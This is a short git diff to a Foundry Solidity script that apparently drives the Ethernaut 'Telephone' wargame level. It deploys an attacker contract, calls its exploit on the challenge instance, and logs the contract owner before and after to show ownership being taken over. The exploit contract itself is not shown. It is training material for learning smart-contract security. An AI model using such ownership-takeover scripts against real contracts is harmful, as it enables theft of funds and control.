@@ -6,13 +6,16 @@ import "instances/04_telephone.sol";
 import "contracts/04_telephone.sol";
 
 contract AttackerTelephoneScript is Script {
-    address telephone = vm.envAddress("INSTANCE");
+    Telephone telephone = Telephone(vm.envAddress("INSTANCE"));
 
     function run() external {
         vm.startBroadcast();
 
         AttackerTelephone attackerTelephone = new AttackerTelephone();
-        attackerTelephone.exploit(telephone);
+
+        console.log("Current Owner is : ", telephone.owner());
+        attackerTelephone.exploit(address(telephone));
+        console.log("New Owner is : ", telephone.owner());
 
         vm.stopBroadcast();
     }
